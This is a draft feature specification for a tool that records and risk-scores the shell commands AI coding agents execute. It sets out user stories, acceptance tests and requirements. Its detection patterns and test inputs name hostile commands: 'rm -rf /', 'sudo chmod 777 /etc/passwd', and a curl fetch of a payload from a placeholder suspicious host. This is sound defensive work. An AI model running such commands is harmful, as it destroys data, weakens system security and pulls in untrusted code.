# Feature Specification: Process Monitoring & Command Detection

**Feature Branch**: `1-process-monitoring`
**Created**: 2026-02-24
**Status**: Draft
**Input**: User description: "Add the ability to detect and record shell commands that AI agents execute, not just file changes."

## User Scenarios & Testing *(mandatory)*

### User Story 1 - Command Detection in Watch Mode (Priority: P1)

A developer runs `unworldly watch` on a project directory while an AI agent (e.g., Claude Code, Cursor) works on their codebase. Currently, Unworldly only records file changes. With this feature, the developer also sees every shell command the AI agent executes — `npm install`, `git commit`, `curl`, `rm -rf`, etc. — appear in real-time alongside file events in a unified timeline.

**Why this priority**: This is the core capability. Without detecting commands, the feature has no value. File monitoring alone misses half of what AI agents do — an agent can `curl` a malicious URL or `rm -rf` critical files without Unworldly recording it.

**Independent Test**: Can be fully tested by running `unworldly watch .`, then executing shell commands in the watched directory, and verifying that command events appear in the terminal output with correct details (command name, arguments, timestamp).

**Acceptance Scenarios**:

1. **Given** Unworldly is watching a directory, **When** a shell command (`npm install lodash`) is executed as a child process within the watched directory, **Then** a command event is recorded with the command name, arguments, timestamp, and process ID.
2. **Given** Unworldly is watching a directory, **When** a command is executed, **Then** the command event appears in real-time terminal output alongside file events in chronological order.
3. **Given** Unworldly is watching a directory, **When** multiple rapid commands are executed, **Then** all commands are captured without dropping events.
4. **Given** Unworldly is watching a directory, **When** a command finishes, **Then** the exit code is recorded with the event.

---

### User Story 2 - Command Risk Scoring (Priority: P1)

Every detected command is automatically risk-scored using the same safe/caution/danger model as file events. Dangerous commands (`rm -rf`, `sudo`, `curl` to unknown URLs) are flagged as danger. Safe commands (`git add`, `ls`, `echo`) are marked safe. Unknown or suspicious commands (`npm install unknown-pkg`, `chmod 777`) are marked caution.

**Why this priority**: Risk scoring is what makes Unworldly useful — raw command logging without risk assessment is just a less useful version of `history`. Risk scoring transforms command detection into actionable security intelligence.

**Independent Test**: Can be tested by calling the command risk scoring function with a list of known commands and verifying each returns the correct risk level and reason.

**Acceptance Scenarios**:

1. **Given** a command `rm -rf /` is detected, **When** risk scoring runs, **Then** it is classified as `danger` with reason "Destructive recursive deletion".
2. **Given** a command `git add .` is detected, **When** risk scoring runs, **Then** it is classified as `safe`.
3. **Given** a command `npm install unknown-package-name` is detected, **When** risk scoring runs, **Then** it is classified as `caution` with reason "Installing unverified package".
4. **Given** a command `sudo chmod 777 /etc/passwd` is detected, **When** risk scoring runs, **Then** it is classified as `danger` with reason "Elevated privilege command".
5. **Given** a command `curl http://suspicious-url.xyz/payload` is detected, **When** risk scoring runs, **Then** it is classified as `danger` with reason "Network request to external URL".

---

### User Story 3 - Unified Session Recording (Priority: P2)

Command events are stored in the session JSON file alongside file events, creating a single unified timeline. When a user runs `unworldly replay` or `unworldly report`, both file changes and command executions appear together in chronological order, giving a complete picture of what the AI agent did.

**Why this priority**: Without persisting command events in the session, they vanish when the watch ends. Replay and report are how users audit agent behavior after the fact — these must include commands to provide complete coverage.

**Independent Test**: Can be tested by running a watch session with both file changes and commands, saving it, then loading the session and verifying both event types are present and correctly ordered by timestamp.

**Acceptance Scenarios**:

1. **Given** a completed session with both file and command events, **When** the user runs `unworldly replay`, **Then** both file changes and command executions appear in the timeline in chronological order.
2. **Given** a completed session with command events, **When** the user runs `unworldly report`, **Then** the report includes a "Commands Executed" section listing all commands with their risk levels.
3. **Given** a completed session, **When** the user runs `unworldly report --format markdown`, **Then** the markdown output includes command events in the timeline table and a dedicated dangerous commands section that covers both file and command dangers.

---

### User Story 4 - Beautiful Real-Time Command Display (Priority: P2)

Command events display in the terminal with the same color-coded, icon-rich formatting as file events. Dangerous commands are highlighted in red, caution in yellow, safe in green. Command events are visually distinct from file events (different icon or prefix) so users can quickly scan the output and understand what type of activity occurred.

**Why this priority**: CLI-First is a core principle. The terminal output must be beautiful and instantly scannable. Without visual distinction between file and command events, the output becomes a confusing wall of text.

**Independent Test**: Can be tested by formatting sample command events and verifying the output contains correct ANSI color codes, icons, and layout.

**Acceptance Scenarios**:

1. **Given** a command event with risk level `danger`, **When** displayed in the terminal, **Then** it uses red coloring with a distinct command icon (e.g., `$` or `>_`) different from file event icons.
2. **Given** a command event with risk level `safe`, **When** displayed in the terminal, **Then** it uses green coloring with the command icon.
3. **Given** mixed file and command events, **When** displayed in sequence, **Then** the user can visually distinguish file events from command events at a glance.

---

### User Story 5 - Configurable Command Allowlist/Blocklist (Priority: P3)

Users can customize command risk scoring via `.unworldly/config.json`. They can define custom patterns that override default risk levels — for example, marking their internal CLI tool as safe, or flagging a specific npm package as dangerous. This supports per-project customization of what's considered risky.

**Why this priority**: Different projects have different risk profiles. A DevOps project may consider `docker` commands safe, while a frontend project might flag them. Customization makes Unworldly useful across diverse environments.

**Independent Test**: Can be tested by creating a `.unworldly/config.json` with custom risk patterns, running the command risk scorer against commands that match those patterns, and verifying custom rules override defaults.

**Acceptance Scenarios**:

1. **Given** a config file with `"allowlist": [{"pattern": "my-safe-tool", "risk": "safe"}]`, **When** the command `my-safe-tool deploy` is detected, **Then** it is classified as `safe` regardless of default patterns.
2. **Given** a config file with `"blocklist": [{"pattern": "bad-package", "risk": "danger", "reason": "Known vulnerable package"}]`, **When** `npm install bad-package` is detected, **Then** it is classified as `danger` with the custom reason.
3. **Given** no config file exists, **When** commands are detected, **Then** default risk patterns are used without errors.
4. **Given** a malformed config file, **When** Unworldly starts, **Then** it warns the user and falls back to defaults.

---

### Edge Cases

- What happens when a command is detected that is not in any pattern list? Classified as `safe` by default (safe until proven otherwise).
- What happens when the process monitoring system is not supported on the user's OS? Unworldly MUST warn the user and continue operating with file-only monitoring (graceful degradation).
- What happens when hundreds of commands are spawned rapidly (e.g., a build script)? Events MUST be buffered and none dropped, but display may batch updates to avoid overwhelming the terminal.
- What happens when a command has no arguments? Record the command name alone with empty arguments.
- What happens when a command contains sensitive data in arguments (e.g., passwords, tokens)? Arguments are recorded as-is; users are responsible for session data privacy (consistent with Local-First Privacy principle — data stays local).

## Requirements *(mandatory)*

### Functional Requirements

- **FR-001**: System MUST detect shell commands spawned as child processes within or related to the watched directory.
- **FR-002**: System MUST record each detected command as a structured event containing: timestamp, command name, arguments, working directory, process ID, and exit code (when available).
- **FR-003**: System MUST classify every detected command into one of three risk levels: `safe`, `caution`, or `danger`, with a human-readable reason.
- **FR-004**: System MUST include default risk patterns for common dangerous commands (`rm -rf`, `sudo`, `curl`, `wget`, `chmod`, `dd`, `mkfs`, `kill -9`).
- **FR-005**: System MUST include default risk patterns for common caution commands (`npm install`, `pip install`, `git push`, `docker run`, `brew install`).
- **FR-006**: System MUST include default risk patterns for common safe commands (`git add`, `git status`, `ls`, `cat`, `echo`, `pwd`, `node`, `npm test`, `npm run build`).
- **FR-007**: System MUST display command events in real-time terminal output with color-coded risk indicators matching the existing file event display style.
- **FR-008**: System MUST visually distinguish command events from file events in terminal output using a distinct icon or prefix.
- **FR-009**: System MUST persist command events in the session JSON file alongside file events in the `events` array.
- **FR-010**: System MUST include command events in `replay` output, displayed in chronological order with file events.
- **FR-011**: System MUST include command events in `report` output, with a dedicated section for dangerous commands (covering both file and command dangers).
- **FR-012**: System MUST support a `.unworldly/config.json` file for custom command risk patterns (allowlist and blocklist) that override default patterns.
- **FR-013**: System MUST gracefully degrade to file-only monitoring if process monitoring is unavailable on the current platform, with a warning to the user.
- **FR-014**: System MUST NOT interfere with or slow down the commands being monitored (Zero Interference principle).
- **FR-015**: System MUST NOT make any network requests as part of command monitoring (Local-First Privacy principle).

### Key Entities

- **CommandEvent**: A new event type extending the existing `WatchEvent` model. Represents a detected shell command with command name, arguments, working directory, process ID, exit code, and risk assessment.
- **CommandRiskPattern**: A pattern definition for matching commands to risk levels. Contains a regex or string pattern, the target risk level, and a human-readable reason.
- **MonitorConfig**: Configuration for command monitoring loaded from `.unworldly/config.json`. Contains allowlist and blocklist arrays of custom `CommandRiskPattern` entries.

## Success Criteria *(mandatory)*

### Measurable Outcomes

- **SC-001**: Users can see 100% of shell commands executed in the watched directory during a monitoring session — no commands slip through unrecorded.
- **SC-002**: Every detected command receives a risk classification within 100ms of detection, with no perceptible delay to the user.
- **SC-003**: Session recordings contain a complete, unified timeline of both file changes and command executions, verifiable by comparing against manual observation.
- **SC-004**: The `replay` and `report` commands produce output that includes both file and command events without any user action or flags — it just works.
- **SC-005**: Unworldly's monitoring overhead remains below 2% CPU and 50MB RAM even with command monitoring enabled (Zero Interference principle).
- **SC-006**: Users can customize command risk patterns via config file, with custom rules correctly overriding defaults in 100% of matching cases.
- **SC-007**: On platforms where process monitoring is unavailable, Unworldly continues to function with file-only monitoring and a clear warning message.
